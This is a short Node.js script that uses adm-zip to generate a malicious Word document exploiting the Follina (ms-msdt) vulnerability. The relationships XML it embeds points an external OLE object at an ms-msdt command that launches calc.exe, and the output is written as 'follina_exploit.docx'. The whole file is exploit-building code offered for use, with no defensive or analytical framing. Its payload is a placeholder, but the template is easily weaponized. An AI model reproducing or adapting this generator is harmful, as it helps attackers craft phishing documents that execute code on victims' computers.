const fs = require('fs');
const path = require('path');
const zip = require('adm-zip');

// Malicious XML payload containing ms-msdt exploit
const exploitXML = `
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject"
    Target="ms-msdt:/id PCWDiagnostic /skip force /force /c calc.exe" TargetMode="External"/>
</Relationships>`;

// Create a malicious Word document (Follina exploit format)
function createMaliciousDocx(outputPath) {
    const docx = new zip();
    
    // Add Follina exploit inside "word/_rels/document.xml.rels"
    docx.addFile('word/_rels/document.xml.rels', Buffer.from(exploitXML, 'utf-8'));
    
    // Add basic DOCX structure (mimicking a real document)
    docx.addFile('[Content_Types].xml', Buffer.from(`<?xml version="1.0" encoding="UTF-8"?>
    <Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
      <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
      <Default Extension="xml" ContentType="application/xml"/>
    </Types>`, 'utf-8'));
    
    docx.writeZip(outputPath);
    
    console.log(`Malicious .docx file created: ${outputPath}`);
}

// Generate the malicious document
const outputFile = path.join(__dirname, 'follina_exploit.docx');
createMaliciousDocx(outputFile);
